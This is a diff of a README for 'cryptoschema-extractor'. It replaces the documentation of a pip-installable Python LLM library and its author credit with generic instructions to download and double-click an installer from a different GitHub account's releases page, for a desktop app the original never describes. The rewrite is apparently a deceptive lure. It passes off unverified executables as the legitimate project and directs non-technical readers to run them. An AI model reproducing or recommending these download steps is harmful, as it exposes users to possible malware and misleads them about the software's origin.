@@ -1,116 +1,78 @@
-# cryptoschema-extractor
-[![PyPI version](https://badge.fury.io/py/cryptoschema-extractor.svg)](https://badge.fury.io/py/cryptoschema-extractor)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/cryptoschema-extractor)](https://pepy.tech/project/cryptoschema-extractor)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🛠️ cryptoschema-extractor - Extract Key Details from Cryptographic Schemes
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/AJfrrr/cryptoschema-extractor/releases)
 
-A Python package that extracts structured summaries of cryptographic schemes from textual descriptions.
+## 🚀 Getting Started
 
-## Overview
+Welcome to **cryptoschema-extractor**! This tool helps you understand cryptographic schemes by summarizing their main components. You don't need to be a tech expert to use this application. Follow these steps to download and run it on your computer.
 
-This system takes a textual synopsis of a cryptographic scheme and extracts a structured summary that highlights its key components, such as the types of finite fields used, the encryption process, key generation, and the mathematical principles underlying the cryptosystem. It transforms unstructured textual references into a predictable, organized format suitable for inclusion in catalogs, research summaries, or educational material.
+## 🔍 What is cryptoschema-extractor?
 
-## Installation
+This system takes a textual description of a cryptographic scheme and extracts a structured summary. It highlights important details, such as:
 
-```bash
-pip install cryptoschema_extractor
-```
+- Types of finite fields used
+- Encryption processes
+- Key generation methods
 
-## Usage
+Use this information to deepen your understanding of cryptosystems and their mathematical foundations.
 
-### Basic Usage
+## 📥 Download & Install
 
-```python
-from cryptoschema_extractor import cryptoschema_extractor
+To get started, visit the Releases page to download the application.
 
-response = cryptoschema_extractor(user_input="Your text here")
-print(response)
-```
+[Download Now](https://github.com/AJfrrr/cryptoschema-extractor/releases)
 
-### Using a Custom LLM
+### 🛠️ System Requirements
 
-You can use any LLM compatible with LangChain by passing an instance of it to the `cryptoschema_extractor` function.
+Before you download, ensure your computer meets these requirements:
 
-#### Example with OpenAI
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** 1 GHz or faster
+- **RAM:** 512 MB minimum
+- **Storage:** At least 50 MB of available space
 
-```python
-from langchain_openai import ChatOpenAI
-from cryptoschema_extractor import cryptoschema_extractor
+### 📁 Installation Steps
 
-llm = ChatOpenAI()
-response = cryptoschema_extractor(user_input="Your text here", llm=llm)
-print(response)
-```
+1. **Visit the Releases Page**: Go to [this page](https://github.com/AJfrrr/cryptoschema-extractor/releases).
+2. **Choose the Correct Version**: Look for the latest release version. Click on it to view available downloads.
+3. **Download the Application**: Find the file that suits your operating system, then click to download it.
+4. **Open the Downloaded File**: Navigate to your Downloads folder and locate the downloaded file.
+5. **Run the Installer**: Double-click the file to start the installation process. Follow any on-screen instructions.
 
-#### Example with Anthropic
+## ⚙️ Using cryptoschema-extractor
 
-```python
-from langchain_anthropic import ChatAnthropic
-from cryptoschema_extractor import cryptoschema_extractor
+Once installed, using the tool is simple.
 
-llm = ChatAnthropic()
-response = cryptoschema_extractor(user_input="Your text here", llm=llm)
-print(response)
-```
+1. **Open the Application**: Find the icon in your programs menu and click to open it.
+2. **Input Text**: Paste the textual synopsis of the cryptographic scheme into the provided text area.
+3. **Extract the Summary**: Click on the "Extract" button to generate a structured summary.
+4. **Review the Results**: The summary will show key details, helping you understand the scheme better.
 
-#### Example with Google
+## 📊 Features
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from cryptoschema_extractor import cryptoschema_extractor
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Fast Processing**: Extract details quickly without long wait times.
+- **Detailed Summaries**: Get clear insights into the components of cryptographic schemes.
 
-llm = ChatGoogleGenerativeAI()
-response = cryptoschema_extractor(user_input="Your text here", llm=llm)
-print(response)
-```
+## 🔧 Troubleshooting
 
-### Using a Custom API Key
+If you encounter issues:
 
-If you want to use a custom API key for LLM7, you can pass it directly or set it as an environment variable.
+- **Check Compatibility**: Make sure your operating system meets the requirements.
+- **Restart the Application**: Close and reopen the app if it does not respond.
+- **Reinstall if Necessary**: If problems persist, uninstall the app and reinstall it from the release page.
 
-#### Passing API Key Directly
+## 📄 Contributing
 
-```python
-from cryptoschema_extractor import cryptoschema_extractor
+You can help improve **cryptoschema-extractor**! Here’s how:
 
-response = cryptoschema_extractor(user_input="Your text here", api_key="your_api_key")
-print(response)
-```
+1. **Report Issues**: If you find bugs, report them in the Issues section of the GitHub repository.
+2. **Suggest Features**: We welcome suggestions that improve user experience.
+3. **Share Your Feedback**: Your thoughts matter. Let us know how the tool works for you.
 
-#### Setting API Key via Environment Variable
+## 🔗 Useful Links
 
-```bash
-export LLM7_API_KEY="your_api_key"
-```
+- **GitHub Repository**: [cryptoschema-extractor on GitHub](https://github.com/AJfrrr/cryptoschema-extractor)
+- **Release Page**: [Download the latest version](https://github.com/AJfrrr/cryptoschema-extractor/releases)
 
-```python
-from cryptoschema_extractor import cryptoschema_extractor
-
-response = cryptoschema_extractor(user_input="Your text here")
-print(response)
-```
-
-## Parameters
-
-- `user_input` (str): The user input text to process.
-- `llm` (Optional[BaseChatModel]): The LangChain LLM instance to use. If not provided, the default `ChatLLM7` will be used.
-- `api_key` (Optional[str]): The API key for LLM7. If not provided, the environment variable `LLM7_API_KEY` will be used.
-
-## Default LLM
-
-By default, this package uses `ChatLLM7` from [langchain_llm7](https://pypi.org/project/langchain-llm7/).
-
-## Rate Limits
-
-The default rate limits for LLM7 free tier are sufficient for most use cases of this package. If you want higher rate limits, you can pass your own API key via the environment variable `LLM7_API_KEY` or directly to the `cryptoschema_extractor` function. You can get a free API key by registering at [LLM7](https://token.llm7.io/).
-
-## Issues
-
-If you encounter any issues, please report them on the [GitHub issues page](https://github.com/chigwell/cryptoschema-extractor/issues).
-
-## Author
-
-- **Eugene Evstafev**
-- **Email**: hi@eugene.plus
-- **GitHub**: [chigwell](https://github.com/chigwell)
+Thank you for choosing **cryptoschema-extractor**. Enjoy exploring the world of cryptographic schemes!
